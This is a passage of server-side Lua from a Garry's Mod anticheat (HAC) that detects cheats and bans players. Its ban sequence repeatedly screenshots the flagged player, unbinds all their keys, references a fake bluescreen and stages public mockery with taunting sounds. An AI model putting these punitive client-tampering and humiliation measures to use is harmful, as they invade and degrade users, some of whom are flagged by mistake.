		HAC.BannedIP[ IPAddr ] = {SID, Nick}
		
		//HAC_DB
		local Log 		= "HAC_DB/"..SID:SID()..".txt"
		local Reason	= Nick:VerySafe()..", "..Args1
		if not file.Exists(Log, "DATA") then
			HAC.file.Write(Log, Format("Skid\n%s\n%s\n", Nick, Args1) )
			
			//ADD TO SKIDCHECK
			HAC.Skid.Add("sk_bulk.txt", SID, Reason, true)
		end
		
		//Make IS_BANNED.TXT
		local FName = ply.HAC_Dir.."/IS_BANNED.txt"
		if not file.Exists(FName, "DATA") then
			local This = Args1
			This = This..Format('\n\n\t["%s"] = {"%s", HAC.Fake.Global},', IPAddr,	Reason)
			This = This..Format('\n\n\t["%s"] = {"%s", HAC.Fake.Global},', SID, 	Reason)
			
			HAC.file.Write(FName, This)
		end
		
		//Total
		HAC.AddOneBan()
		
		//Abort map change
		HAC.HSP.AbortMapChange()
		
		//SCREENSHOT EVERY
		timer.Simple(20, function()
			if IsValid(ply) and ply:Banned() then
				ply:TakeSCEvery(30)
			end
		end)
		
		
		//STOP HERE IF SILENT
		if HAC.Silent:GetBool() then return Logged end
		
		
		
		//Add bots for aiming!
		if #player.GetHumans() <= 2 then
			RunConsoleCommand("bot")
			RunConsoleCommand("bot")
		end
		
		//HORRIBLE PERSON
		timer.Simple(20, function()
			if IsValid(ply) then
				ply:HAC_EmitSound("hac/you_are_a_horrible_person.mp3", "Horrible person")
			end
		end)
		
		//BAN
		if not HAC.Banned[ SID ] then
			HAC.Banned[ SID ] = 1
			
			--UNBAN
			timer.Simple((HACBantime * 60), function()
				HAC.Banned[ SID ] = nil
			end)
		end
	end
	//WAIT FOR MORE LOGS
	
	//BanHook, POST - extra punishments
	if HAC.Init.Call_BanHook(BANHOOK_POST, ply,Args1,args,dontban,bantime,justlog,wait_time) then return end
	
	
	
	//Sound just before, fixme, these timers are really messy
	local Time = wait_time and wait_time or HAC.WaitCVar:GetInt()
	timer.Simple(Time - 5, function()
		if not IsValid(ply) or HAC.Silent:GetBool() then return end
		if ply:HKS_InProgress() or ply:Burst_InProgress() or ply.HAC_Done5Sound then return end
		ply.HAC_Done5Sound = true
		
		for k,v in pairs( player.GetHumans() ) do
			if v != ply then
				v:HAC_SPS("ambient/levels/canals/headcrab_canister_ambient6.wav")
			end
		end
	end)
	
	//Main timer
	timer.Simple(Time, function()
		if not IsValid(ply) or HAC.Silent:GetBool() then return end
		if ply:HKS_InProgress() or ply:Burst_InProgress() then return end
		
		
		//JUST BEFORE, FOR PHOTO
		if not ply.DONETIMER then
			ply.DONETIMER = true
			
			for k,v in pairs( player.GetHumans() ) do
				//If HeX
				if v:HAC_IsHeX() then
					//Close spectate, not in the pic!
					if v.HAC_DoneSpectate then
						v:HACPEX("hac_spectate_unload")
					end
					
					//Respawn for the pic
					local Here = v.HAC_SpawnHere
					v:RespawnIfDead(Here and Here.Pos)
					if Here and Here.Ang then
						v:SetEyeAngles(Here.Ang)
					end
					v:SetHealth(13377)
				end
				
				
				//Mock the cheater
				if v == ply then
					ply:HAC_EmitSound("vo/citadel/br_mock01.wav", "6 SECONDS TO GO")
					
					//Unbind
					ply:UnbindAll()
					
					//CLOSE BSOD
					ply:CloseBluescreen()
					
					//Remove Balls of Steel
					ply:RemoveBallsOfSteel(true)
					
					//Stop spinning
					ply:StopSpin()
					continue
				end
				
				//Tell everyone else
				v:HACGAN(
					"Get your camera ready, "..Nick.." is about to go BOOM!",
					NOTIFY_CLEANUP,
					4,
					Sound("vo/novaprospekt/al_readings02.wav")
				)
			end
		end
		
		
		//KICK HIS ASS, wait 6s
		timer.Simple(6, function()
			if not IsValid(ply) or HAC.Silent:GetBool() then return end
			
			--DO HAX
			if not ply.DONEMSG then
				ply.DONEMSG = true
				
				//ACHIEVEMENT
				if SACH and SACH.ACH_ScannedAlone then
					SACH.ACH_ScannedAlone(ply) --Scanned Alone
				end
				
				//RANK
				if ply:GetLevel() != 7 and not (HAC_IsHeX or dontban) then
					ply:SetLevel(7) --Cheater
				end
				
				//Message
				MsgN("\n[HAC] Autobanned: ", Nick," "..HACBantime.." min ban. Hacks detected!\n")
				HAC.CAT(
					HAC.RED,"[", HAC.GREEN,"HAC", HAC.RED,"] ",
					HAC.RED, "Autobanned ",
					ply:TeamColor(), Nick,
					HAC.WHITE, " "..HACBantime.." min ban. Hacks detected!"
				)
				
				
				//Sound
				for k,v in pairs( player.GetHumans() ) do
					if v != ply then
						v:HAC_SPS("ambient/machines/thumper_startup1.wav")
					end
				end
				
				//Highway to hell
				timer.Simple(6.5, function()
					for k,v in pairs( player.GetHumans() ) do
						v:EmitSound("hac/highway_to_hell.mp3")
					end
				end)
				
				//HAAAAAAX!
				ply:DoHax()
			end
			
			
			//FINAL BAN
			timer.Simple(7.37, function()
				if not IsValid(ply) or ply.DONEKICK then return end
				ply.DONEKICK = true
				
				if not dontban and not HAC_IsHeX and not ply:IsBot() then
					//Total bans
					HAC.TotalBans = HAC.TotalBans + 1
					local Bans = HAC.GetAllBans() + table.Count(HAC.Skiddies)
					Bans = HAC.NiceNum(Bans)..HAC.AddTH(Bans)
					
					//Message
					HAC.CAT(
						HAC.RED,"[", HAC.GREEN,"HAC", HAC.RED,"] ",
						ply:TeamColor(), Nick,
						HAC.WHITE, " just became the ",
						HAC.PURPLE, Bans,
						HAC.WHITE, " banned player!"
					)
					print("\n[HAC] ", Nick, " just became the "..Bans.." banned player!\n")
				end
				
				
				HAC.PlayerDisconnected(ply)
				ply.HAC_NoLogDisconnect = true
				
				ply:HAC_Drop("[HAC] Autobanned: "..HAC.Time.Ban.."min ban. Hacks detected!. If this ban is in error, post on www.steamcommunity.com/id/MFSiNC")
			end)
		end)
	end)
end

//DoBan
function _R.Player:DoBan(str, dontban,bantime,justlog,wait_time, always_log)
	if table.HasValue(HAC.SERVER.White_FalsePositives, str) then return end --False pos
	return HAC.DoBan(self,"", (isstring(str) and {str} or str), dontban,bantime,justlog,wait_time, always_log)
end
//LogOnly
function _R.Player:LogOnly(str, always_log)
	if table.HasValue(HAC.SERVER.White_FalsePositives, str) then return end --False pos
	return HAC.DoBan(self,"", (isstring(str) and {str} or str), true,nil,true,nil, always_log)
end


//CheckThatServerside
function HAC.CheckThatServerside(ply,args,Args1)
	if not IsValid(ply) then return end
	if ply:IsBot() then return end
	
	local Args2 = args[2] or 1337
	local count = tonumber(Args2)
	
	//_G Count
	if Args1:Check("GCount") then
		if not ply:CanDoThisInit("GCount", count) then return end
		
		ply.HAC_GCountInit = true
		
		if count != HAC.Count._G then
			ply:DoBan("GCount "..count.." != "..HAC.Count._G)
		end
		return INIT_DO_NOTHING
		
		
	//_R Count
	elseif Args1:Check("RCount") then
		if not ply:CanDoThisInit("RCount", count) then return end
		
		ply.HAC_RCountInit = true
		
		if count != HAC.Count._R then
			ply:DoBan("RCount "..count.." != "..HAC.Count._R)
		end
		return INIT_DO_NOTHING
		
		
	//gcinfo
	elseif Args1:Check("GCICount") then
		if not ply:CanDoThisInit("GCICount", count) then return end
		
		ply.HAC_GCICountInit = true
		
		if not HAC.GCICount[ count ] then
			ply:LogOnly("GCICount "..count) --Log only
		end
		return INIT_DO_NOTHING
		
		
	//collectgarbage
	elseif Args1:Check("CGBCount") then
		if not ply:CanDoThisInit("CGBCount", count) then return end
		
		ply.HAC_CGBCount = count
		
		//Log everyone's counts
		local Log = Format("\n[%s] %s - %s", HAC.Date(), ply.HAC_CGBCount, ply:HAC_Info() )
		HAC.file.Append("hac_gcicount.txt", Log)
		
		//Only check if windows --fixme, shitty code, use HACHasWindows hook or something
		local TID = "CGBCount_check_"..ply:SteamID()
		timer.Create(TID, 0.5, 0, function()
			if IsValid(ply) then
				if ply.HAC_GamePath then
					if ply.HAC_IsWindows then
						if not HAC.Count.Garbage[ ply.HAC_CGBCount ] then
							ply:LogOnly("CGBCount "..ply.HAC_CGBCount)
						else
							ply.HAC_CGBCorrect = true
						end
					else
						ply.HAC_CGBCorrect = true --Always true for Mac/Linux, fixme, check GPath AND system.IsWindows
					end
					
					ply.HAC_CGBCountInit = true
					timer.Destroy(TID)
				end
			else
				timer.Destroy(TID)
			end
		end)
		
		return INIT_DO_NOTHING
		
		
	//GCheck
	elseif Args1:Check("GCheck") then
		if Args1 == "GCheck=_G.TEXT_ALIGN_CENTER=[[1]] (NUMBER)" then --Init check
			ply:FailInit("GCheck_Again", HAC.Msg.HC_GCAgain)
		end
		
		ply.HAC_GCheckInit = true
		
		if Args1 == "GCheck=_G.HACInstalled=[[1]] (NUMBER)" then
			return INIT_DO_NOTHING --Init
		end
		
		HAC.file.Append(ply.HAC_Log._G, Format('\n\t["%s"] = 1,', Args1:gsub("GCheck=", "") ) )
		return INIT_BAN
		
		
	//package.loaded Count
	elseif Args1:Check("PLCount") then
		if not ply:CanDoThisInit("PLCount", count) then return end
		
		ply.HAC_PL_CountInit = true
		
		if count != HAC.Count.PLCount then
			ply:DoBan("PLCount "..count.." != "..HAC.Count.PLCount)
		end
		return INIT_DO_NOTHING
		
		
	//SPATH
	elseif Args1:Check("SPath") then
		local path = tostring(args[2] or "Gone")
		local line = tonumber(args[3] or 0)
		if not ply:CanDoThisInit("SPath", path..":"..line) then return end
		
		if path != "addons/hex's anticheat/lua/en_hac.lua" then
			ply:FailInit(Format("SPATH=[%s:%s]", path,line), HAC.Msg.HC_Init)
		end
		if (line != (HAC.Count.LenCL - HAC.Count.LenLCL) ) then
			ply:FailInit(Format("LCLFailure=%s != (%s - %s)", line, HAC.Count.LenCL, HAC.Count.LenLCL), HAC.Msg.HC_LCLFail)
		end
		
		ply.HAC_LCLInit = true
		return INIT_DO_NOTHING
		
		
	//SetViewAngles / SetEyeAngles
	elseif (Args1:Check("SetViewAngles=") or Args1:Check("SetEyeAngles=")) then
		if HAC.SERVER.White_EyeAngles[ Args1 ] then return INIT_DO_NOTHING end --Whitelisted
		
		HAC.file.Append(ply.HAC_Log.Eye, Format('\t["%s"] = 1,\n', Args1) )
		
		--ply:UnbindAll(Args1)
		--ply:EatKeys()
		
		//NONONONONONO
		ply:HAC_EmitSound("hac/no_no_no.mp3", "NoNoNoNo")
		
		return INIT_BAN
		
		
	//concommand.Add
	elseif Args1:Check("WCCA=") then --WHITELIST, COMMANDS
		local cmd,where = Args2, (args[3] or "gone")
		
		HAC.file.Append(ply.HAC_Log.CCA, Format('\n\t{"%s", "%s"},', cmd,where) )
		ply:DoBan('concommand.Add("'..cmd..'") ['..where.."]'")
		
		return INIT_DO_NOTHING
		
		
	//hook.Add
	elseif Args1:Check("WHOOK=") then --WHITELIST, HOOK
		local what,k,where = Args2, (args[3] or "gone"), (args[4] or "gone")
		
		HAC.file.Append(ply.HAC_Log.Hook, Format('\n\t{"%s", "%s", "%s"},', what,k,where) )
		ply:DoBan( Format('hook.Add("%s", "%s") [%s]', what,k,where) )
		
		//REALLY, YOU'RE GOING TO CHEAT?
		ply:HAC_EmitSound("hac/really_cheat.mp3", "ReallyCheat")
		
		return INIT_DO_NOTHING
		
		
	//GAMEMODE
	elseif Args1:Check("WGM=") then --WHITELIST, GM
		local what,where = Args2, (args[3] or "gone")
		
		HAC.file.Append(ply.HAC_Log.WGM, Format('\n\t{"%s", "%s"},', what,where) )
		ply:DoBan("GAMEMODE."..what.." ["..where.."]")
		
		return INIT_DO_NOTHING
		
		
	//surface.CreateFont
	elseif Args1:Check("CreateFont=") then --WHITELIST, FONT
		local new,where = Args2, (args[3] or "gone")
		
		HAC.file.Append(ply.HAC_Log.Font, Format('\n\t{"%s", "%s"},', new,where) )
		ply:DoBan( Format('surface.CreateFont("%s") [%s]', new,where) )
		
		return INIT_DO_NOTHING
		
		
	//CreateClientConVar
	elseif Args1:Check("CreateClientConVar(") then --WHITELIST, CreateClientConVar
		HAC.file.Append(ply.HAC_Log.CCC, Format('\n\t["%s"] = 1,', Args1) )
		return INIT_BAN
		
		
	//CreateConVar
	elseif Args1:Check("CreateConVar(") then --WHITELIST, CreateConVar
		HAC.file.Append(ply.HAC_Log.CCV, Format('\n\t["%s"] = 1,', Args1) )
		return INIT_BAN
		
		
	//require
	elseif Args1:Check("require(") then --WHITELIST, REQUIRE
		HAC.file.Append(ply.HAC_Log.Req, Format('\n\t["%s"] = 1,', Args1) )
		return INIT_BAN
		
		
	//ply.ConCommand
	elseif Args1:Check("PCC=") or Args1:Check("RCC=") then
		--ply:UnbindAll(Args1)
		--ply:EatKeys()
		
		//STILL NOT WORKING
		timer.Simple(6, function()
			if IsValid(ply) then
				ply:HAC_EmitSound("hac/still_not_working.mp3", "StillNotWorking")
			end
		end)
		
		return INIT_BAN
		
		
	//print / Msg / MsgN / chat.AddText / MsgC
	elseif Args1:Check("print(") or Args1:Check("Msg(") or Args1:Check("MsgN(") or Args1:Check("chat.AddText(") or Args1:Check("MsgC(") then
		
		//CRC
		local This = Format('\n\t["%s"] = 1,', Args2)
		if not HAC.MsgC_LoggedThis then HAC.MsgC_LoggedThis = {} end
		if not HAC.MsgC_LoggedThis[ This ] then
			HAC.MsgC_LoggedThis[ This ] = true
			
			HAC.file.Append(ply.HAC_Log.Msg, This)
		end
		
		//Message
		HAC.file.Append(ply.HAC_Log.print, "\n"..Args1)
		
		//Log
		Args1 = Args1:gsub("\n", " ")
		ply:LogOnly(Args1)
		
		return INIT_DO_NOTHING
		
		
	//Hidden init check
	elseif Args1:find("MATERIAL_TRIANGLE_STRIP") then
		ply.HAC_TCInit = true
		return INIT_DO_NOTHING
		
	//CME, too big
	elseif Args1:Check("CME=TooBig") or Args1:Check("CME=NoCont") then
		if not table.HasValue(HAC.SERVER.White_CME, Args1) then
			ply:LogOnly(args) --Log only
		end
		return INIT_DO_NOTHING
		
	//file.Read avoidance, dyn+.lua
	elseif Args1:Check("ICheck=") then --fixme, total fucking mess. get proper gatehook for this!
		if Args1:find("(lua/", nil,true) and Args1:EndsWith(".lua)") then
			if Args1:Count("/") == 1 then
				--lua/dyn+.lua
				ply:DoBan(Args1.." (FileAvoid)")
			else
				--lua/autorun/makarov's_men_npcs.lua
				if not table.HasValue(HAC.SERVER.White_FalsePositives, Args1) then
					ply:LogOnly(Args1)
				end
			end
			
			return INIT_DO_NOTHING
		end
		
		if Args1:Check("ICheck=NotFO") then
			if not table.HasValue(HAC.SERVER.White_FalsePositives, Args1) then
				ply:LogOnly(Args1)
			end
			
			return INIT_DO_NOTHING
		end
	end
	
	
	
	--- Inits ---
	if Args1 == "InitPostEntity" then
		local HACKey = tostring( args[4] ) or "fuck"
		
		if not ply.HACKeyInit2 then
			ply.HACKeyInit2 = HACKey
		end
		
		if ply.HAC_IPSInit then
			ply:FailInit("IPS_Again", HAC.Msg.SE_Also)
			return INIT_DO_NOTHING
		end
		ply.HAC_IPSInit = true
		
		return INIT_DO_NOTHING
		
		
	elseif Args1 == "KR30=KR30LDD" then
		if ply.HAC_KR30Init then
			ply:FailInit("KR30Init_Again", HAC.Msg.SE_KRAgain)
			return INIT_DO_NOTHING
		end
		ply.HAC_KR30Init = true
		
		return INIT_DO_NOTHING
		
		
	elseif Args1 == util.CRC(HAC.BanCommand) then
		if ply.HAC_BCInit then
			ply:FailInit("BCInit_Again", HAC.Msg.HC_BCIAgain)
			return INIT_DO_NOTHING
		end
		ply.HAC_BCInit = true
		
		return INIT_DO_NOTHING
		
	elseif Args1 == util.CRC(HAC.AuxBanCommand) then --Never got umsg clientside
		ply:FailInit("BCInit_Never", HAC.Msg.HC_BCINever)
		return INIT_DO_NOTHING
	end
	
	
	
	//GateHook
	for what,func in pairs(HAC.Init.Hooks) do
		if not (Args1 == what or Args1:Check(what)) then continue end
		
		//Easy mode, func is message, Fail for it!
		if not isfunction(func) then
			ply:FailInit(Args1, func)
			return INIT_DO_NOTHING
		end
		
		//Call
		local run,ret = pcall(func, ply,Args1,args, what)
		if not run then
			//Error
			local Err = "HAC.Init.Hooks['"..what.."']: Error: [\n"..tostring(Args1).."\n\n"..tostring(ret).."\n]"
			
			ply:FailInit(Err, HAC.Msg.SE_GHError)
			break
		end
		
		//true nothing, false ban
		return (not ret or ret == INIT_DO_NOTHING) and INIT_DO_NOTHING or INIT_BAN
	end
	
	return INIT_BAN
end

HAC.Init.Add("HAC_LCLInit", 		HAC.Msg.SE_ScrPath)
HAC.Init.Add("HAC_GCICountInit",	HAC.Msg.SE_Count)
HAC.Init.Add("HAC_CGBCountInit",	HAC.Msg.SE_Count,	INIT_LONG)
HAC.Init.Add("HAC_GCountInit", 		HAC.Msg.SE_Count)
HAC.Init.Add("HAC_PL_CountInit",	HAC.Msg.SE_Count)
HAC.Init.Add("HAC_RCountInit", 		HAC.Msg.SE_Count)
HAC.Init.Add("HAC_GCheckInit", 		HAC.Msg.SE_GCheck,	INIT_LONG)
HAC.Init.Add("HAC_TCInit", 			HAC.Msg.HC_TC_Init, INIT_VERY_LONG)

HAC.Init.Add("HAC_IPSInit", 		HAC.Msg.SE_IPFail)
HAC.Init.Add("HAC_KR30Init", 		HAC.Msg.SE_KR30)
HAC.Init.Add("HAC_BCInit", 			HAC.Msg.HC_BCIFail, INIT_LONG)



--- Command gate ---
function HAC.KickMe(ply,cmd,args)
	if not IsValid(ply) then
		if #args > 0 then
			for k,v in pairs(args) do
				ErrorNoHalt("! Kickme error: "..tostring(cmd)..", "..tostring(v).."\n")
			end
		end
		return
	end
	
	local Args1 = args[1]
	if not ValidString(Args1) then
		ply:FailInit("Args1 invalid!", HAC.Msg.HC_Init)
		return
	end
	
	
	//Check serverside
	if HAC.CheckThatServerside(ply,args,Args1) then
		return
		
	//False pos
	elseif table.HasValue(HAC.SERVER, Args1) then
		return
		
	//Init
	elseif HAC.Init.FailedInits[ Args1 ] then
		ply:FailInit(Args1, HAC.Msg.HC_Init)
		return
		
	//Log only
	elseif Args1:CheckInTable(HAC) then
		ply:LogOnly(args)
		return
		
	else
		//BANBANBAN
		HAC.DoBan(ply,cmd,args)
	end
end
concommand.Add(HAC.BanCommand,		HAC.KickMe)
concommand.Add(HAC.SEBanCommand,	HAC.KickMe)
concommand.Add(HAC.FakeBanCommand,	HAC.KickMe)

concon.Add(HAC.AuxBanCommand,		HAC.KickMe)
concon.Add(HAC.BanCommand,			HAC.KickMe)
concon.Add(HAC.SEBanCommand,		HAC.KickMe)
concon.Add(HAC.FakeBanCommand,		HAC.KickMe)

for k,v in pairs(HAC.AllBanCommand) do
	concommand.Add(v, HAC.KickMe)
	concon.Add(v, HAC.KickMe)
end



//Command
function HAC.Command(ply,cmd,args)
	if #args < 1 then
		//Print everyone
		ply:print("")
		for k,v in pairs( player.GetHumans() ) do
			local Res = v:Banned() and "BANNED" or v:HasFailedInit() and "Failed" or ""
			ply:print( Format("%s\t%s", Res,v.AntiHaxName) )
		end
		ply:print("")
		
		return
	end
	
	//Manual ban
	local Him = tonumber( args[1] )
	if not Him or Him == 0 then
		ply:print("[HAC] Invalid index")
	end
	
	Him = Player(Him)
	if not IsValid(Him) then
		ply:print("[HAC] Invalid player")
		return
	end
	
	Him.DONEBAN = false
	Him:DoBan("ManualBan")
end
concommand.Add("hac", HAC.Command)



//Unban all
function HAC.UnbanAll(ply,cmd,args)
	local Tot = 0
	for k,v in pairs(HAC.Banned) do
		Tot = Tot + 1
		ply:print("[OK] Unbanning "..k)
	end
	for k,v in pairs(HAC.BannedIP) do
		ply:print("[OK] Unbanning IP "..k)
	end
	HAC.Banned		= {}
	HAC.BannedIP	= {}
	
	ply:print("[OK] Unbanned "..Tot.."\n")
end
concommand.Add("unbanall", HAC.UnbanAll)


//Clear LCD
function HAC.Clear(ply,cmd,args)
	HAC.TotalBans	= 0
	HAC.TotalHacks	= 0
	HAC.StreamHKS	= 0 --Fixme, see sv_StreamHKS
	HAC.TotalFails	= 0
	
	ply:print("[HAC] Clear all counters")
end
concommand.Add("hac_clear", HAC.Clear)


//Debug
function HAC.ToggleDebug(ply,cmd,args)
	if HAC.Conf.Debug then
		HAC.Conf.Debug 	= not HAC.Conf.Debug
		HAC.BCode.Debug = not HAC.BCode.Debug
		
		ply:print("[HAC] ---DEBUG DISABLED---")
	else
		HAC.Conf.Debug 	= not HAC.Conf.Debug
		HAC.BCode.Debug = not HAC.BCode.Debug
		
		ply:print("[HAC] +++DEBUG ENABLED+++")
	end
end
concommand.Add("hac_debug", HAC.ToggleDebug)


//Set spawn pos for pic!
function HAC.SetHere(self)
	if not IsValid(self) then return end
	self:print("[HAC] Set Here")
	
	self.HAC_SpawnHere = {
		Pos	= self:GetPos(),
		Ang	= self:EyeAngles(),
	}
end
concommand.Add("here", HAC.SetHere)



HACInstalled = (HACInstalled or 1) + 1

MsgN("  Loaded all plugins, "..HAC.Lists.." Lists!")
MsgN("///////////////////////////////////")
MsgN("//          [HAC] loaded         //")
MsgN("///////////////////////////////////\n")











